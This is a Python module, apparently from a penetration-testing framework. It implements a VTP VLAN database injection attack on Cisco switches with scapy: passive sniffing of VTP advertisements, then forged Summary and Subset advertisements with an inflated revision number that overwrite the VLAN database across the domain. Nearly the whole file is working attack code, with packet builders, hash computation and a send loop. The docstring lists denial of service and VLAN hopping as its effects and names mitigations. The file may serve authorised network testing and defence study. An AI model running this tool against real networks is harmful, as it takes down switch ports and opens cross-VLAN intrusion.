"""
VTP VLAN Database Injection — T1599.001

Forges VTP (VLAN Trunking Protocol) Summary + Subset advertisements
with a higher revision number to overwrite the VLAN database on all
VTP Client / Server switches in the domain.

Attack impact:
  - Wipe existing VLANs → all ports on deleted VLANs go down (DoS)
  - Add rogue VLANs → use with VLAN hopping (dvlan module) or
    double-tag for cross-VLAN traffic
  - Trunk reconfiguration → force trunk ports to carry the attacker's VLAN

Cisco-only protocol. VTP operates on trunk links (802.1Q/ISL) and
uses the VTP domain name + password as the only "auth". A switch
that joins the domain with a higher revision overwrites all others.

Two modes:
  scan   — sniff for VTP Summary Advertisements (LLC/SNAP, VTP
           ethertype) to learn: domain name, revision number,
           VLAN count, VTP version. No packets sent.
  inject — send Summary Ad (high revision) + Subset Ad (new VLAN list)
           on a trunk port. All VTP Server/Client switches in the
           domain replace their VLAN database.

Prerequisites:
  - Attacker port must be a trunk (802.1Q)
  - Must know or sniff the VTP domain name
  - VTP password (if set) — empty by default on most deployments

Mitigation: VTP Transparent mode, VTPv3 primary-server lock,
VTP password, prune unused VLANs, disable VTP entirely.
"""
import struct
import hashlib
import time

from scapy.all import Ether, Raw, sendp, sniff, hexdump

NAME = "vtp"
DESCRIPTION = "VTP VLAN database injection — overwrite domain VLAN DB via forged revision"
ATTCK_ID = "T1599.001"

# VTP uses LLC/SNAP encapsulation on trunk links
# DST MAC for VTP: 01:00:0c:cc:cc:cc (Cisco multicast)
VTP_DST_MAC = "01:00:0c:cc:cc:cc"

# SNAP header for VTP: AA:AA:03 (LLC) + 00:00:0C (OUI Cisco) + 20:03 (PID VTP)
SNAP_HEADER = b"\xaa\xaa\x03\x00\x00\x0c\x20\x03"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True,
                   help="Trunk interface (must be 802.1Q trunk)")
    p.add_argument("--mode", choices=["scan", "inject"], default="scan")
    p.add_argument("--domain", default="",
                   help="VTP domain name (required for inject; scan discovers it)")
    p.add_argument("--revision", type=int, default=None,
                   help="VTP revision number (default: sniffed+10 or 99999)")
    p.add_argument("--vlans", default="1,666",
                   help="Comma-separated VLAN IDs to inject (default: 1,666)")
    p.add_argument("--vlan-names", default=None,
                   help="Comma-separated VLAN names matching --vlans (default: auto)")
    p.add_argument("--password", default="",
                   help="VTP password (empty = no password)")
    p.add_argument("--vtp-version", type=int, default=1, choices=[1, 2],
                   help="VTP version (1 or 2)")
    p.add_argument("--timeout", type=int, default=30,
                   help="Scan window seconds")
    p.add_argument("-c", "--count", type=int, default=5)
    p.add_argument("--interval", type=float, default=3.0)
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


# ── VTP PDU builders ──────────────────────────────────────────────────────────

def _domain_pad(domain, length=32):
    """VTP domain name is zero-padded to 32 bytes."""
    name = domain.encode("ascii", errors="replace")[:length]
    return name + b"\x00" * (length - len(name))


def _compute_md5(domain, password, revision, vlans_raw):
    """
    VTP MD5 hash computation (used in VTPv1/v2 Summary Ad).
    hash = MD5(domain + revision_bytes + vlan_data + password)
    """
    h = hashlib.md5()
    h.update(domain.encode("ascii", errors="replace"))
    h.update(struct.pack("!I", revision))
    if vlans_raw:
        h.update(vlans_raw)
    if password:
        h.update(password.encode("ascii", errors="replace"))
    return h.digest()


def _build_vlan_info_entry(vlan_id, vlan_name=None):
    """
    VTP VLAN-Info entry for Subset Advertisement.
    Format:
      info_len(1) | status(1) | type(1) | name_len(1) |
      vlan_id(2) | mtu(2) | 802.10_index(4) |
      vlan_name (padded to 4-byte boundary)
    """
    if vlan_name is None:
        vlan_name = f"VLAN{vlan_id:04d}"
    name_bytes = vlan_name.encode("ascii", errors="replace")
    name_len = len(name_bytes)
    # Pad name to 4-byte boundary
    pad_len = (4 - (name_len % 4)) % 4
    padded_name = name_bytes + b"\x00" * pad_len

    info_len = 12 + len(padded_name)  # fixed(12) + padded name
    status = 0x00      # active
    vlan_type = 0x01   # ethernet
    mtu = 1500
    index_802_10 = vlan_id  # 802.10 SAID = VLAN ID (common)

    entry = struct.pack("!BBBB", info_len, status, vlan_type, name_len)
    entry += struct.pack("!HHI", vlan_id, mtu, index_802_10)
    entry += padded_name
    return entry


def _build_summary_advertisement(version, domain, revision, vlan_count,
                                 password="", updater_ip="1.1.1.1",
                                 vlans_raw=b""):
    """
    VTP Summary Advertisement (code 0x01).
    Sent first; tells peers "I have revision N with M VLANs".
    """
    code = 0x01
    followers = 0x01  # subset ad follows
    domain_padded = _domain_pad(domain)
    updater_bytes = bytes(int(x) for x in updater_ip.split("."))

    body = struct.pack("!BBB", version, code, followers)
    body += struct.pack("!B", len(domain))  # domain name length
    body += domain_padded
    body += struct.pack("!I", revision)
    body += updater_bytes
    # Timestamp: 12 bytes ASCII (all zeros = "not set")
    body += b"000000000000"

    md5_hash = _compute_md5(domain, password, revision, vlans_raw)
    body += md5_hash

    return body


def _build_subset_advertisement(version, domain, revision, vlan_entries):
    """
    VTP Subset Advertisement (code 0x02).
    Contains actual VLAN-Info entries that overwrite the peer's VLAN DB.
    """
    code = 0x02
    sequence = 0x01
    domain_padded = _domain_pad(domain)

    body = struct.pack("!BBB", version, code, sequence)
    body += struct.pack("!B", len(domain))
    body += domain_padded
    body += struct.pack("!I", revision)

    for entry in vlan_entries:
        body += entry

    return body


# ── Scan mode ─────────────────────────────────────────────────────────────────

def _scan(args, logger):
    """Passive scan for VTP advertisements on trunk."""
    logger.info("[VTP] scan %ds on %s — listening for VTP Summary Advertisements ...",
                args.timeout, args.interface)
    domains = {}

    def handler(pkt):
        try:
            if not pkt.haslayer(Ether):
                return
            if pkt[Ether].dst.lower() != VTP_DST_MAC:
                return
            raw = bytes(pkt[Raw]) if pkt.haslayer(Raw) else b""
            # Look for SNAP header
            snap_pos = raw.find(SNAP_HEADER)
            if snap_pos < 0:
                return
            vtp_data = raw[snap_pos + len(SNAP_HEADER):]
            if len(vtp_data) < 40:
                return
            version = vtp_data[0]
            code = vtp_data[1]
            domain_len = vtp_data[3]
            domain_name = vtp_data[4:4 + domain_len].decode("ascii", errors="replace").rstrip("\x00")
            revision = struct.unpack("!I", vtp_data[36:40])[0]

            code_names = {0x01: "Summary-Ad", 0x02: "Subset-Ad", 0x03: "Ad-Request", 0x04: "Join"}
            code_str = code_names.get(code, f"0x{code:02x}")

            key = domain_name or "(empty)"
            if key not in domains:
                domains[key] = {"version": version, "revision": revision, "count": 0, "src": ""}
                logger.info("[VTP] NEW domain: '%s'  VTPv%d  revision=%d  type=%s  src=%s",
                            domain_name, version, revision, code_str, pkt[Ether].src)
            domains[key]["count"] += 1
            # Track highest revision
            if revision > domains[key]["revision"]:
                domains[key]["revision"] = revision
            domains[key]["src"] = pkt[Ether].src
        except Exception:
            pass

    # VTP uses LLC/SNAP on 01:00:0c:cc:cc:cc
    sniff(iface=args.interface, prn=handler, store=False, timeout=args.timeout,
          filter="ether dst 01:00:0c:cc:cc:cc")

    logger.info("[VTP] scan done: %d domain(s) discovered", len(domains))
    for dom, info in domains.items():
        logger.info("  domain='%-20s'  VTPv%d  highest_rev=%d  ads=%d  last_src=%s",
                    dom, info["version"], info["revision"], info["count"], info["src"])

    if not domains:
        logger.warning("[VTP] No VTP ads seen — VTP may be disabled or port is not trunking.")
    else:
        for dom, info in domains.items():
            logger.info("[VTP] To inject domain '%s': use --revision %d (current+10) --domain '%s'",
                        dom, info["revision"] + 10, dom)
    return True


# ── Inject mode ───────────────────────────────────────────────────────────────

def _inject(args, logger):
    """Send forged VTP Summary + Subset to overwrite VLAN database."""
    if not args.domain:
        logger.error("--domain is required for inject mode (run scan first to discover)")
        return False

    vlan_ids = [int(v.strip()) for v in args.vlans.split(",")]
    vlan_names = None
    if args.vlan_names:
        vlan_names = [n.strip() for n in args.vlan_names.split(",")]
        if len(vlan_names) != len(vlan_ids):
            logger.error("--vlan-names count (%d) must match --vlans count (%d)",
                         len(vlan_names), len(vlan_ids))
            return False

    for vid in vlan_ids:
        if not 1 <= vid <= 4094:
            logger.error("VLAN ID %d out of range (1-4094)", vid)
            return False

    revision = args.revision if args.revision is not None else 99999

    # Build VLAN entries
    vlan_entries = []
    for idx, vid in enumerate(vlan_ids):
        name = vlan_names[idx] if vlan_names else None
        vlan_entries.append(_build_vlan_info_entry(vid, name))
    vlans_raw = b"".join(vlan_entries)

    # Build VTP PDUs
    summary = _build_summary_advertisement(
        args.vtp_version, args.domain, revision,
        len(vlan_ids), args.password, vlans_raw=vlans_raw
    )
    subset = _build_subset_advertisement(
        args.vtp_version, args.domain, revision, vlan_entries
    )

    # Wrap in Ethernet + LLC/SNAP
    summary_pkt = (Ether(dst=VTP_DST_MAC) /
                   Raw(load=SNAP_HEADER + summary))
    subset_pkt = (Ether(dst=VTP_DST_MAC) /
                  Raw(load=SNAP_HEADER + subset))

    if args.dry_run:
        logger.info("--dry-run: VTP Summary Advertisement preview (revision=%d)", revision)
        summary_pkt.show()
        hexdump(bytes(SNAP_HEADER + summary)[:80])
        logger.info("--dry-run: VTP Subset Advertisement preview (%d VLANs)", len(vlan_ids))
        subset_pkt.show()
        hexdump(bytes(SNAP_HEADER + subset)[:80])
        logger.info("Domain='%s'  revision=%d  VLANs=%s", args.domain, revision, vlan_ids)
        return True

    try:
        for i in range(args.count):
            # Summary first, then Subset (VTP protocol order)
            sendp(summary_pkt, iface=args.interface, verbose=args.verbose)
            time.sleep(0.05)
            sendp(subset_pkt, iface=args.interface, verbose=args.verbose)
            logger.info("[VTP] %d/%d  Summary(rev=%d)+Subset(%d VLANs)  domain='%s'",
                        i + 1, args.count, revision, len(vlan_ids), args.domain)
            time.sleep(args.interval)

        logger.info("[VTP] Done — check 'show vtp status' + 'show vlan brief' on peers")
        logger.info("[VTP] If accepted → VLAN DB overwritten, ports on deleted VLANs are down")
        logger.info("[VTP] If rejected → VTP password mismatch or VTPv3 primary lock (good finding)")
        return True
    except Exception as e:
        logger.error("[VTP] Error: %s", e)
        return False


def run(args, logger):
    from core.common import require_root
    require_root()
    logger.info("START | technique=%s | iface=%s | mode=%s | domain=%s",
                ATTCK_ID, args.interface, args.mode, args.domain or "(scan)")
    ok = _scan(args, logger) if args.mode == "scan" else _inject(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1
